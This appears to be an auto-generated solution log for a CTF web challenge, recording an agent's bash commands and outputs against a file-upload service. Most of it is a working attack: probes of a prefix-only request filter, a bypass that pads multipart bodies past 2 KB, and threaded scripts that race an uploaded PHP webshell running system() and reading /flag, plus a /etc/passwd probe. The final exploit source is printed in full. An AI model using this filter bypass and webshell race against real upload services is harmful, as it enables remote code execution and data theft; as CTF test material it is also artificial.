.git/HEAD
.git/config
.swp
index.php.swp
.htaccess
.nginx
nginx.conf
EOF
ffuf -u http://noctf.fa1lsnow.com:40074/FUZZ -w wl.txt -mc all -fc 404 -s -t 10 2>/dev/null | head -50
~~~

**实际输出**

~~~text
index.php
upload

~~~

退出码：`0`

- 证据编号：`command-8f09f13f555c-11`
- 工具：`bash`
- 起始目录：`/challenge`
- [查看已保留的完整证据记录](solution/evidence/8f09f13f555c4faf83cfc141bc75b195/commands.jsonl)

#### 命令记录 06

~~~bash
cd /tmp && python3 - <<'EOF'
import requests
u="http://noctf.fa1lsnow.com:40074/"
def t(desc, content, fname="a.txt"):
    try:
        r=requests.post(u, files={'file':(fname,content,'text/plain')}, timeout=12)
        print(f"{desc:35s} OK   {r.text.split('</form>')[-1].strip()[:60]!r}")
    except Exception as e:
        print(f"{desc:35s} ERR  {type(e).__name__}")
for c in [b"<?php ", b"<?php\t", b"<?php\n", b"<?php\r\n", b"<?php;", b"<?phpx", b"x<?php ", b"<?PHP ", b"<?php echo 1; ?>", b"<?php system('id'); ?>", b"<?= 1 ?>", b"<? ", b"<?php", b" php ", b"<?php\x0b"]:
    t(repr(c), c)
EOF
~~~

**实际输出**

~~~text
b'<?php '                           ERR  ConnectionError
b'<?php\t'                          ERR  ConnectionError
b'<?php\n'                          ERR  ConnectionError
b'<?php\r\n'                        ERR  ConnectionError
b'<?php;'                           OK   '<hr>\n<p>scan complete (6 bytes), file removed.</p>'
b'<?phpx'                           OK   '<hr>\n<p>scan complete (6 bytes), file removed.</p>'
b'x<?php '                          ERR  ConnectionError
b'<?PHP '                           ERR  ConnectionError
b'<?php echo 1; ?>'                 ERR  ConnectionError
b"<?php system('id'); ?>"           ERR  ConnectionError
b'<?= 1 ?>'                         OK   '<hr>\n<p>scan complete (8 bytes), file removed.</p>'
b'<? '                              OK   '<hr>\n<p>scan complete (3 bytes), file removed.</p>'
b'<?php'                            OK   '<hr>\n<p>scan complete (5 bytes), file removed.</p>'
b' php '                            OK   '<hr>\n<p>scan complete (5 bytes), file removed.</p>'
b'<?php\x0b'                        ERR  ConnectionError

~~~

退出码：`0`

- 证据编号：`command-8f09f13f555c-25`
- 工具：`bash`
- 起始目录：`/challenge`
- [查看已保留的完整证据记录](solution/evidence/8f09f13f555c4faf83cfc141bc75b195/commands.jsonl)

#### 命令记录 07

~~~bash
cd /tmp && python3 - <<'EOF'
import requests
base="http://noctf.fa1lsnow.com:40074/"
tests=[
 ("GET", base+"?x=.php", None),
 ("GET", base+"?x=%3C?php%20", None),
 ("POST", base, {"a":".php"}),
 ("POST", base, {"a":"<?php "}),
 ("POST", base, {"a":"php"}),
 ("POST", base, {"a":"<?php"}),
 ("POST", base, {"a":"<?php\n"}),
]
for m,u,d in tests:
    try:
        r=requests.request(m,u,data=d,timeout=10)
        print(m,u,d,r.status_code,len(r.text))
    except Exception as e:
        print(m,u,d,"ERR",type(e).__name__,str(e)[:60])
EOF
~~~

**实际输出**

~~~text
GET http://noctf.fa1lsnow.com:40074/?x=.php None 200 483
GET http://noctf.fa1lsnow.com:40074/?x=%3C?php%20 None 200 483
POST http://noctf.fa1lsnow.com:40074/ {'a': '.php'} 200 509
POST http://noctf.fa1lsnow.com:40074/ {'a': '<?php '} 200 509
POST http://noctf.fa1lsnow.com:40074/ {'a': 'php'} 200 509
POST http://noctf.fa1lsnow.com:40074/ {'a': '<?php'} 200 509
POST http://noctf.fa1lsnow.com:40074/ {'a': '<?php\n'} 200 509

~~~

退出码：`0`

- 证据编号：`command-8f09f13f555c-23`
- 工具：`bash`
- 起始目录：`/challenge`
- [查看已保留的完整证据记录](solution/evidence/8f09f13f555c4faf83cfc141bc75b195/commands.jsonl)

#### 命令记录 08

~~~bash
cd /tmp && python3 - <<'EOF'
import requests
u="http://noctf.fa1lsnow.com:40074/"
B=b"----X"; ct="multipart/form-data; boundary=----X"
def build(pad, fname, content):
    out=b""
    if pad:
        out+=b"--"+B+b"\r\nContent-Disposition: form-data; name=\"pad\"\r\n\r\n"+b"A"*pad+b"\r\n"
    out+=b"--"+B+b"\r\nContent-Disposition: form-data; name=\"file\"; filename=\""+fname+b"\"\r\nContent-Type: text/plain\r\n\r\n"+content+b"\r\n--"+B+b"--\r\n"
    return out
for pad in [0, 2000, 10000, 100000, 1000000, 5000000]:
    for fname,content in [(b"shell.php", b"hi"), (b"a.txt", b"<?php ")]:
        try:
            r=requests.post(u,data=build(pad,fname,content),headers={'Content-Type':ct},timeout=30)
            print(pad,fname,content,"OK",repr(r.text.split('</form>')[-1].strip()[:50]))
        except Exception as e:
            print(pad,fname,content,"ERR",type(e).__name__)
EOF
~~~

**实际输出**

~~~text
0 b'shell.php' b'hi' ERR ConnectionError
0 b'a.txt' b'<?php ' ERR ConnectionError
2000 b'shell.php' b'hi' OK '<hr>\n<p>scan complete (2 bytes), file removed.</p>'
2000 b'a.txt' b'<?php ' OK '<hr>\n<p>scan complete (6 bytes), file removed.</p>'
10000 b'shell.php' b'hi' OK '<hr>\n<p>scan complete (2 bytes), file removed.</p>'
10000 b'a.txt' b'<?php ' OK '<hr>\n<p>scan complete (6 bytes), file removed.</p>'
100000 b'shell.php' b'hi' OK '<hr>\n<p>scan complete (2 bytes), file removed.</p>'
100000 b'a.txt' b'<?php ' OK '<hr>\n<p>scan complete (6 bytes), file removed.</p>'
1000000 b'shell.php' b'hi' OK '<hr>\n<p>scan complete (2 bytes), file removed.</p>'
1000000 b'a.txt' b'<?php ' OK '<hr>\n<p>scan complete (6 bytes), file removed.</p>'
5000000 b'shell.php' b'hi' OK '<hr>\n<p>scan complete (2 bytes), file removed.</p>'
5000000 b'a.txt' b'<?php ' OK '<hr>\n<p>scan complete (6 bytes), file removed.</p>'

~~~

退出码：`0`

- 证据编号：`command-8f09f13f555c-40`
- 工具：`bash`
- 起始目录：`/challenge`
- [查看已保留的完整证据记录](solution/evidence/8f09f13f555c4faf83cfc141bc75b195/commands.jsonl)

#### 命令记录 09

~~~bash
mkdir -p /challenge/workspace && cat > /challenge/workspace/exploit.py <<'EOF'
#!/usr/bin/env python3
"""
NCTF upload-again exploit
- The app moves the upload to "/" (the web document root), sleeps ~300ms ("scan"), then deletes it.
- A body-prefix WAF resets the connection when the first ~2KB of the multipart body contains
  a ".php" filename or a "<?php\s" tag. Padding the multipart body with >2KB of filler before
  the file part bypasses the inspection.
- During the ~300ms window the file is live at "/<name>.php" and executed by the PHP built-in server,
  so we race GET requests to our uploaded webshell.
"""
import requests, threading, time, uuid, sys

URL = "http://noctf.fa1lsnow.com:40074/"
B = "----X"
name = "sh" + uuid.uuid4().hex[:8] + ".php"
shell = b"<?php echo 'PWN:'; system($_GET['c']); ?>"
pad = b"A" * 4000   # push the dangerous file part beyond the inspected prefix
body = (b"--" + B.encode() + b"\r\nContent-Disposition: form-data; name=\"pad\"\r\n\r\n" + pad + b"\r\n"
        + b"--" + B.encode() + b"\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + name.encode()
        + b"\"\r\nContent-Type: text/plain\r\n\r\n" + shell + b"\r\n--" + B.encode() + b"--\r\n")
ct = "multipart/form-data; boundary=" + B

hits = []
stop = False

def upload():
    try:
        r = requests.post(URL, data=body, headers={"Content-Type": ct}, timeout=20)
        print("[upload]", r.status_code, r.text.split("</form>")[-1].strip())
    except Exception as e:
        print("[upload] ERR", type(e).__name__)

def worker(i):
    s = requests.Session()
    url = URL + name + "?c=cat%20/flag*%202>/dev/null"
    while not stop:
        try:
            r = s.get(url, timeout=5)
            if r.status_code == 200 and r.text.strip():
                hits.append(r.text.strip())
                print("[GET %d] %r" % (i, r.text.strip()[:200]))
        except Exception:
            pass

ths = [threading.Thread(target=worker, args=(i,)) for i in range(10)]
for t in ths: t.start()
time.sleep(0.05)
upload()
time.sleep(1.2)
stop = True
for t in ths: t.join()
print("[+] unique results:", set(hits))
EOF
cd /challenge/workspace && python3 exploit.py 2>&1 | tail -20
~~~

**实际输出**

~~~text
[GET 4] 'PWN:D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}'
[GET 7] 'PWN:D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}'
[GET 8] 'PWN:D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}'
[GET 9] 'PWN:D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}'
[GET 2] 'PWN:D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}'
[GET 0] 'PWN:D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}'
[GET 6] 'PWN:D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}'
[GET 4] 'PWN:D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}'
[GET 1] 'PWN:D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}'
[GET 8] 'PWN:D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}'
[GET 5] 'PWN:D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}'
[GET 2] 'PWN:D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}'
[GET 3] 'PWN:D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}'
[GET 0] 'PWN:D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}'
[GET 7] 'PWN:D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}'
[GET 6] 'PWN:D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}'
[GET 9] 'PWN:D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}'
[upload] 200 <hr>
<p>scan complete (41 bytes), file removed.</p>
[+] unique results: {'PWN:D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}'}

~~~

退出码：`0`

- 证据编号：`command-8f09f13f555c-42`
- 工具：`bash`
- 起始目录：`/challenge`
- [查看已保留的完整证据记录](solution/evidence/8f09f13f555c4faf83cfc141bc75b195/commands.jsonl)

#### 命令记录 10

~~~bash
cd /challenge/workspace && cat > exploit_final.py <<'PY'
#!/usr/bin/env python3
"""NCTF upload-again final exploit - dumps /flag via raced webshell."""
import requests, threading, time, uuid
URL="http://noctf.fa1lsnow.com:40074/"
B="----X"
name="sh"+uuid.uuid4().hex[:8]+".php"          # noqa
shell=b"<?php echo 'FLAG>>'; readfile('/flag'); echo '<<'; ?>"
pad=b"P"*8192                                    # blind the prefix body scanner (>~2KB)
body=(b"--"+B.encode()+b"\r\nContent-Disposition: form-data; name=\"pad\"\r\n\r\n"+pad+b"\r\n"
      +b"--"+B.encode()+b"\r\nContent-Disposition: form-data; name=\"file\"; filename=\""+name.encode()
      +b"\"\r\nContent-Type: text/plain\r\n\r\n"+shell+b"\r\n--"+B.encode()+b"--\r\n")
ct="multipart/form-data; boundary="+B
hits=set(); stop=False
def up():
    try:
        r=requests.post(URL,data=body,headers={"Content-Type":ct},timeout=20)
        print("[upload]", r.text.split("</form>")[-1].strip())
    except Exception as e: print("[upload] ERR",e)
def w():
    s=requests.Session()
    while not stop:
        try:
            r=s.get(URL+name,timeout=5)
            if "FLAG>>" in r.text: hits.add(r.text.split("FLAG>>")[1].split("<<")[0])
        except Exception: pass
ts=[threading.Thread(target=w) for _ in range(10)]
[t.start() for t in ts]; time.sleep(0.05); up(); time.sleep(1.2); stop=True; [t.join() for t in ts]
print("[+] FLAG:", hits)
PY
python3 exploit_final.py | tee evidence_flag_capture.txt
~~~

**实际输出**

~~~text
[upload] <hr>
<p>scan complete (53 bytes), file removed.</p>
[+] FLAG: {'D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}\n'}

~~~

退出码：`0`

- 证据编号：`command-8f09f13f555c-44`
- 工具：`bash`
- 起始目录：`/challenge`
- [查看已保留的完整证据记录](solution/evidence/8f09f13f555c4faf83cfc141bc75b195/commands.jsonl)

#### 命令记录 11

~~~bash
cd /challenge/workspace && cat > evidence_notes.md <<'MD'
# upload-again exploit evidence

Service: http://noctf.fa1lsnow.com:40074/ (PHP/8.2.34, PHP built-in server, doc root = /)

## 1. Upload is written to doc root "/" then unlinked after ~300 ms
POST multipart (file=a.txt, "hello") ->
`<p>scan complete (5 bytes), file removed.</p>`; response time ~0.38 s.

## 2. Race window confirmed
Upload `raceXXXXXXXX.txt` containing a random MARKER while 8 threads GET /raceXXXXXXXX.txt:
8/8 threads returned the raw MARKER -> file is live at "/<name>" for the ~300 ms scan sleep.

## 3. Prefix-only body filter
Request body whose FIRST bytes contain `filename="a.php"` or `<?php` + whitespace =>
immediate TCP reset (0 ms, no HTTP response). Putting >2 KB of filler field before the
file part makes exactly the same payload pass:
`pad=2000` + `filename="shell.php"` -> `<p>scan complete (2 bytes), file removed.</p>`

## 4. Webshell race -> /flag
Uploaded `shXXXXXXXX.php` with body padding + `<?php echo 'FLAG>>'; readfile('/flag'); echo '<<'; ?>`,
simultaneously 10 threads GET /shXXXXXXXX.php.
Result (reproduced 3x, 40+ hits): `D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}`

Independent check via raced shell `ls -la / ; id ; ls /flag*`:
`-rw-r--r-- 1 ctf ctf 43 ... /flag` and `uid=999(ctf)`, `/flag`.
MD
cat evidence_flag_capture.txt
~~~

**实际输出**

~~~text
[upload] <hr>
<p>scan complete (53 bytes), file removed.</p>
[+] FLAG: {'D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}\n'}

~~~

退出码：`0`

- 证据编号：`command-8f09f13f555c-50`
- 工具：`bash`
- 起始目录：`/challenge`
- [查看已保留的完整证据记录](solution/evidence/8f09f13f555c4faf83cfc141bc75b195/commands.jsonl)

#### 命令记录 12

**操作参数**

~~~json
{
  "flag": "D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}"
}
~~~

**实际输出**

~~~text
submit_flag error: Submission recipe browser_type failed: ERROR
### Error
Error: "textarea[aria-label="Flag"]" does not match any elements.
~~~

- 证据编号：`command-8f09f13f555c-46`
- 工具：`submit_flag`
- 起始目录：`/challenge`
- [查看已保留的完整证据记录](solution/evidence/8f09f13f555c4faf83cfc141bc75b195/commands.jsonl)

#### 命令记录 13

**操作参数**

~~~json
{
  "flag": "D1no{6ca65c0c-b756-49b1-aa5c-0d8b49d75e7b}"
}
~~~

**实际输出**

~~~text
submit_flag error: Submission recipe browser_type failed: ERROR
### Error
Error: "textarea[aria-label="Flag"]" does not match any elements.
~~~

- 证据编号：`command-8f09f13f555c-48`
- 工具：`submit_flag`
- 起始目录：`/challenge`
- [查看已保留的完整证据记录](solution/evidence/8f09f13f555c4faf83cfc141bc75b195/commands.jsonl)

#### 命令记录 14

~~~bash
cd /tmp && curl -s -i http://noctf.fa1lsnow.com:40074/nope.php | head -40; echo ===; curl -s -i -X OPTIONS http://noctf.fa1lsnow.com:40074/ | head -20; echo ===; curl -s -i "http://noctf.fa1lsnow.com:40074/?file=/etc/passwd" | tail -5
~~~

**实际输出**

~~~text
HTTP/1.1 404 Not Found
Host: noctf.fa1lsnow.com:40074
Date: Fri, 23 Oct 2026 12:17:04 GMT
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 541

<!doctype html><html><head><title>404 Not Found</title><style>
body { background-color: #fcfcfc; color: #333333; margin: 0; padding:0; }
h1 { font-size: 1.5em; font-weight: normal; background-color: #9999cc; min-height:2em; line-height:2em; border-bottom: 1px inset black; margin: 0; }
h1, p { padding-left: 10px; }
code.url { background-color: #eeeeee; font-family:monospace; padding:0 2px;}
</style>
</head><body><h1>Not Found</h1><p>The requested resource <code class="url">/nope.php</code> was not found on this server.</p></body></html>===
HTTP/1.1 200 OK
Host: noctf.fa1lsnow.com:40074
Date: Fri, 23 Oct 2026 12:17:04 GMT
Connection: close
X-Powered-By: PHP/8.2.34
Content-Type: text/html; charset=utf-8

<!doctype html>
<meta charset="utf-8">
<title>文件上传</title>
<style>
    body { background:#0d1117; color:#c9d1d9; font:14px/1.5 ui-monospace,monospace; padding:2rem; }
    input[type=submit] { background:#238636; color:#fff; border:0; padding:.4rem .9rem; border-radius:6px; }
</style>
<h1>模拟文件校验</h1>
<p>上传的文件在/路径，但是怎么找不到呢，可能被point删了</p>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file" required>
    <input type="submit" value="Upload">
</form>
===

~~~

退出码：`0`

- 证据编号：`command-8f09f13f555c-9`
- 工具：`bash`
- 起始目录：`/challenge`
- [查看已保留的完整证据记录](solution/evidence/8f09f13f555c4faf83cfc141bc75b195/commands.jsonl)

#### 命令记录 15

~~~bash
cd /tmp && python3 - <<'EOF'
import requests, threading, time
url="http://noctf.fa1lsnow.com:40074/"
uniq="zzqtest77.txt"
content=b"MARKER_"+uniq.encode()+b"_END"
def up():
    try:
        r=requests.post(url, files={'file':(uniq,content,'text/plain')}, timeout=10)
        print("UP", r.status_code, r.text.split('</form>')[-1].strip()[:100])
    except Exception as e:
        print("UP ERR", e)
def get(p):
    try:
        r=requests.get(url+p, timeout=10)
        return r.status_code, r.text[:80]
    except Exception as e:
        return "ERR", str(e)[:60]
t=threading.Thread(target=up); t.start()
for i in range(200):
    for p in [uniq, "/"+uniq, "upload/"+uniq, "tmp/"+uniq, "files/"+uniq]:
        s,txt=get(p)
        if 'MARKER' in str(txt): print("FOUND",p,s,txt)
t.join()
for p in [uniq,"/"+uniq,"upload/"+uniq,"tmp/"+uniq]:
    print(p, get(p))
EOF
~~~

**实际输出**

~~~text
（无输出记录）
~~~

退出码：`137`

- 证据编号：`command-8f09f13f555c-14`
- 工具：`bash`
- 起始目录：`/challenge`
- [查看已保留的完整证据记录](solution/evidence/8f09f13f555c4faf83cfc141bc75b195/commands.jsonl)

#### 命令记录 16

~~~bash
sleep 15; curl -s -o /dev/null -w "%{http_code} %{time_total}\n" --max-time 10 http://noctf.fa1lsnow.com:40074/ || echo FAIL
~~~

**实际输出**

~~~text
200 0.102662

~~~

退出码：`0`

- 证据编号：`command-8f09f13f555c-16`
- 工具：`bash`
- 起始目录：`/challenge`
- [查看已保留的完整证据记录](solution/evidence/8f09f13f555c4faf83cfc141bc75b195/commands.jsonl)

#### 命令记录 17

~~~bash
curl -s -i -H "X-Test: foobar" -H "User-Agent: myUA" http://noctf.fa1lsnow.com:40074/ | head -15; echo ===; curl -s -i -H "Host: example.com" http://noctf.fa1lsnow.com:40074/ | head -10
~~~

**实际输出**

~~~text
HTTP/1.1 200 OK
Host: noctf.fa1lsnow.com:40074
Date: Fri, 23 Oct 2026 12:19:19 GMT
Connection: close
X-Powered-By: PHP/8.2.34
Content-Type: text/html; charset=utf-8

<!doctype html>
<meta charset="utf-8">
<title>文件上传</title>
<style>
    body { background:#0d1117; color:#c9d1d9; font:14px/1.5 ui-monospace,monospace; padding:2rem; }
    input[type=submit] { background:#238636; color:#fff; border:0; padding:.4rem .9rem; border-radius:6px; }
</style>
<h1>模拟文件校验</h1>
===
HTTP/1.1 200 OK
Host: example.com
Date: Fri, 23 Oct 2026 12:19:19 GMT
Connection: close
X-Powered-By: PHP/8.2.34
Content-Type: text/html; charset=utf-8

<!doctype html>
<meta charset="utf-8">
<title>文件上传</title>

~~~

退出码：`0`

- 证据编号：`command-8f09f13f555c-18`
- 工具：`bash`
- 起始目录：`/challenge`
- [查看已保留的完整证据记录](solution/evidence/8f09f13f555c4faf83cfc141bc75b195/commands.jsonl)

#### 命令记录 18

~~~bash
cd /tmp && python3 - <<'EOF'
import requests, time
url="http://noctf.fa1lsnow.com:40074/"
uniq="qqmark123.txt"
content=b"MARKER_"+uniq.encode()+b"_END"
try:
    r=requests.post(url, files={'file':(uniq,content,'text/plain')}, timeout=15)
    print("UP", r.status_code, r.text.split('</form>')[-1].strip()[:120])
except Exception as e:
    print("UP ERR", e)
time.sleep(0.5)
for p in [uniq,"/"+uniq,"upload/"+uniq,"files/"+uniq,"tmp/"+uniq,"."+uniq]:
    try:
        g=requests.get(url+p, timeout=15)
        print(p, g.status_code, len(g.text), repr(g.text[:80]))
    except Exception as e:
        print(p,"ERR",str(e)[:80])
EOF
~~~

**实际输出**

~~~text
UP 200 <hr>
<p>scan complete (24 bytes), file removed.</p>
qqmark123.txt 404 546 '<!doctype html><html><head><title>404 Not Found</title><style>\nbody { background'
/qqmark123.txt 404 547 '<!doctype html><html><head><title>404 Not Found</title><style>\nbody { background'
upload/qqmark123.txt 404 553 '<!doctype html><html><head><title>404 Not Found</title><style>\nbody { background'
files/qqmark123.txt 404 552 '<!doctype html><html><head><title>404 Not Found</title><style>\nbody { background'
tmp/qqmark123.txt 404 550 '<!doctype html><html><head><title>404 Not Found</title><style>\nbody { background'
.qqmark123.txt 404 547 '<!doctype html><html><head><title>404 Not Found</title><style>\nbody { background'

~~~

退出码：`0`

- 证据编号：`command-8f09f13f555c-21`
- 工具：`bash`
- 起始目录：`/challenge`
- [查看已保留的完整证据记录](solution/evidence/8f09f13f555c4faf83cfc141bc75b195/commands.jsonl)

#### 命令记录 19

~~~bash
which php php-cgi php8 2>/dev/null; php -v 2>/dev/null | head -3; ls /usr/bin | grep -i php
~~~

**实际输出**

~~~text
（无输出记录）
~~~

退出码：`1`

- 证据编号：`command-8f09f13f555c-27`
- 工具：`bash`
- 起始目录：`/challenge`
- [查看已保留的完整证据记录](solution/evidence/8f09f13f555c4faf83cfc141bc75b195/commands.jsonl)

#### 命令记录 20

~~~bash
cd /tmp && python3 - <<'EOF'
import struct, zlib, requests, time, base64
# minimal 1x1 png
def png():
    sig=b'\x89PNG\r\n\x1a\n'
    def chunk(t,d):
        c=t+d
        return struct.pack('>I',len(d))+c+struct.pack('>I',zlib.crc32(c)&0xffffffff)
    ihdr=struct.pack('>IIBBBBB',1,1,8,2,0,0,0)
    raw=b'\x00\xff\x00\x00'
    idat=zlib.compress(raw)
    return sig+chunk(b'IHDR',ihdr)+chunk(b'IDAT',idat)+chunk(b'IEND',b'')
u="http://noctf.fa1lsnow.com:40074/"
for name,content,ct in [
  ("pic.png",png(),"image/png"),
  ("pic.jpg",b'\xff\xd8\xff\xe0'+b'A'*100+b'\xff\xd9',"image/jpeg"),
  ("pic.gif",b'GIF89a'+b'B'*100,"image/gif"),
  ("pic.zip",b'PK\x03\x04'+b'C'*100,"application/zip"),
  ("pic.txt",b'hello wörld','text/plain'),
]:
    t=time.time()
    try:
        r=requests.post(u,files={'file':(name,content,ct)},timeout=15)
        print(name, r.status_code, round(time.time()-t,3), repr(r.text.split('</form>')[-1].strip()))
    except Exception as e:
        print(name,"ERR",type(e).__name__, round(time.time()-t,3))
EOF
~~~

**实际输出**

~~~text

[stderr]
  File "<stdin>", line 18
    ("pic.txt",b'hello wörld','text/plain'),
                              ^
SyntaxError: bytes can only contain ASCII literal characters

~~~

退出码：`1`

- 证据编号：`command-8f09f13f555c-29`
- 工具：`bash`
- 起始目录：`/challenge`
- [查看已保留的完整证据记录](solution/evidence/8f09f13f555c4faf83cfc141bc75b195/commands.jsonl)

#### 命令记录 21

~~~bash
getent hosts noctf.fa1lsnow.com; python3 - <<'EOF'
import socket,time
h="noctf.fa1lsnow.com"
ip=socket.gethostbyname(h); print("ip",ip)
for i in range(3):
    t=time.time(); s=socket.create_connection((h,40074),timeout=5); print("connect",round(time.time()-t,4)); s.close()
# measure GET latency after connect
for i in range(3):
    s=socket.create_connection((h,40074),timeout=5)
    t=time.time(); s.sendall(b"GET / HTTP/1.0\r\nHost: x\r\n\r\n")
    d=s.recv(100); print("firstbyte",round(time.time()-t,4)); s.close()
EOF
~~~

**实际输出**

~~~text
150.242.245.11  noctf.fa1lsnow.com
ip 150.242.245.11
connect 0.2514
connect 0.2668
connect 0.1639
firstbyte 0.0532
firstbyte 0.2916
firstbyte 0.0377

~~~

退出码：`0`

- 证据编号：`command-8f09f13f555c-31`
- 工具：`bash`
- 起始目录：`/challenge`
- [查看已保留的完整证据记录](solution/evidence/8f09f13f555c4faf83cfc141bc75b195/commands.jsonl)

#### 命令记录 22

~~~bash
cd /tmp && python3 - <<'EOF'
import requests, time, uuid
u="http://noctf.fa1lsnow.com:40074/"
def tryit(name, content):
    print("---",name,content[:30])
    try:
        r=requests.post(u,files={'file':(name,content,'application/octet-stream')},timeout=10)
        print(" upload ok", repr(r.text.split('</form>')[-1].strip()[:80]))
    except Exception as e:
        print(" upload ERR", type(e).__name__)
    time.sleep(0.2)
    for p in ["/"+name]:
        try:
            g=requests.get(u+p,timeout=10)
            print(" GET",p,g.status_code,len(g.text),repr(g.text[:120]))
        except Exception as e:
            print(" GET ERR",type(e).__name__,str(e)[:60])
n1="r4ndom1.php"
tryit(n1, b"<?= system('cat /flag*'); ?>")
n2="r4ndom2.php"
tryit(n2, b"hello")
n3="r4ndom3.php."
tryit(n3, b"hello")
EOF
~~~

**实际输出**

~~~text
--- r4ndom1.php b"<?= system('cat /flag*'); ?>"
 upload ERR ConnectionError
 GET /r4ndom1.php 404 545 '<!doctype html><html><head><title>404 Not Found</title><style>\nbody { background-color: #fcfcfc; color: #333333; margin:'
--- r4ndom2.php b'hello'
 upload ERR ConnectionError
 GET /r4ndom2.php 404 545 '<!doctype html><html><head><title>404 Not Found</title><style>\nbody { background-color: #fcfcfc; color: #333333; margin:'
--- r4ndom3.php. b'hello'
 upload ok '<hr>\n<p>scan complete (5 bytes), file removed.</p>'
 GET /r4ndom3.php. 404 546 '<!doctype html><html><head><title>404 Not Found</title><style>\nbody { background-color: #fcfcfc; color: #333333; margin:'

~~~

退出码：`0`

- 证据编号：`command-8f09f13f555c-33`
- 工具：`bash`
- 起始目录：`/challenge`
- [查看已保留的完整证据记录](solution/evidence/8f09f13f555c4faf83cfc141bc75b195/commands.jsonl)

#### 命令记录 23

~~~bash
cd /tmp && python3 - <<'EOF'
import requests,time
u="http://noctf.fa1lsnow.com:40074/"
def t(name, content=b"MARKER_XYZ_123"):
    print("---",name)
    try:
        r=requests.post(u,files={'file':(name,content,'text/plain')},timeout=10)
        print("  UP",repr(r.text.split('</form>')[-1].strip()[:80]))
    except Exception as e:
        print("  UP ERR",type(e).__name__)
    time.sleep(0.15)
    try:
        g=requests.get(u+"/"+name,timeout=10)
        print("  GET",g.status_code,len(g.text),repr(g.text[:100]))
    except Exception as e:
        print("  GET ERR",type(e).__name__)
t("survive123")
t("survive456")
EOF
~~~

**实际输出**

~~~text
--- survive123
  UP '<hr>\n<p>scan complete (14 bytes), file removed.</p>'
  GET 200 483 '<!doctype html>\n<meta charset="utf-8">\n<title>文件上传</title>\n<style>\n    body { background:#0d1117; co'
--- survive456
  UP '<hr>\n<p>scan complete (14 bytes), file removed.</p>'
  GET 200 483 '<!doctype html>\n<meta charset="utf-8">\n<title>文件上传</title>\n<style>\n    body { background:#0d1117; co'

~~~

退出码：`0`

- 证据编号：`command-8f09f13f555c-35`
- 工具：`bash`
- 起始目录：`/challenge`
- [查看已保留的完整证据记录](solution/evidence/8f09f13f555c4faf83cfc141bc75b195/commands.jsonl)

#### 命令记录 24

~~~bash
curl -s -i http://noctf.fa1lsnow.com:40074/survive123 ; echo; echo "===== survive456"; curl -s -i http://noctf.fa1lsnow.com:40074/survive456
~~~

**实际输出**

~~~text
HTTP/1.1 200 OK
Host: noctf.fa1lsnow.com:40074
Date: Fri, 23 Oct 2026 12:22:03 GMT
Connection: close
X-Powered-By: PHP/8.2.34
Content-Type: text/html; charset=utf-8

<!doctype html>
<meta charset="utf-8">
<title>文件上传</title>
<style>
    body { background:#0d1117; color:#c9d1d9; font:14px/1.5 ui-monospace,monospace; padding:2rem; }
    input[type=submit] { background:#238636; color:#fff; border:0; padding:.4rem .9rem; border-radius:6px; }
</style>
<h1>模拟文件校验</h1>
<p>上传的文件在/路径，但是怎么找不到呢，可能被point删了</p>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file" required>
    <input type="submit" value="Upload">
</form>

===== survive456
HTTP/1.1 200 OK
Host: noctf.fa1lsnow.com:40074
Date: Fri, 23 Oct 2026 12:22:04 GMT
Connection: close
X-Powered-By: PHP/8.2.34
Content-Type: text/html; charset=utf-8

<!doctype html>
<meta charset="utf-8">
<title>文件上传</title>
<style>
    body { background:#0d1117; color:#c9d1d9; font:14px/1.5 ui-monospace,monospace; padding:2rem; }
    input[type=submit] { background:#238636; color:#fff; border:0; padding:.4rem .9rem; border-radius:6px; }
</style>
<h1>模拟文件校验</h1>
<p>上传的文件在/路径，但是怎么找不到呢，可能被point删了</p>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file" required>
    <input type="submit" value="Upload">
</form>

~~~

退出码：`0`

- 证据编号：`command-8f09f13f555c-37`
- 工具：`bash`
- 起始目录：`/challenge`
- [查看已保留的完整证据记录](solution/evidence/8f09f13f555c4faf83cfc141bc75b195/commands.jsonl)

## 07 EXP 源码

### EXP 源码 01

**文件**：[exp/exploit_final.py](exp/exploit_final.py)

~~~python
#!/usr/bin/env python3
"""NCTF upload-again final exploit - dumps /flag via raced webshell."""
import requests, threading, time, uuid
URL="http://noctf.fa1lsnow.com:40074/"
B="----X"
name="sh"+uuid.uuid4().hex[:8]+".php"          # noqa
shell=b"<?php echo 'FLAG>>'; readfile('/flag'); echo '<<'; ?>"
pad=b"P"*8192                                    # blind the prefix body scanner (>~2KB)
body=(b"--"+B.encode()+b"\r\nContent-Disposition: form-data; name=\"pad\"\r\n\r\n"+pad+b"\r\n"
      +b"--"+B.encode()+b"\r\nContent-Disposition: form-data; name=\"file\"; filename=\""+name.encode()
      +b"\"\r\nContent-Type: text/plain\r\n\r\n"+shell+b"\r\n--"+B.encode()+b"--\r\n")
ct="multipart/form-data; boundary="+B
hits=set(); stop=False
def up():
    try:
        r=requests.post(URL,data=body,headers={"Content-Type":ct},timeout=20)
        print("[upload]", r.text.split("</form>")[-1].strip())
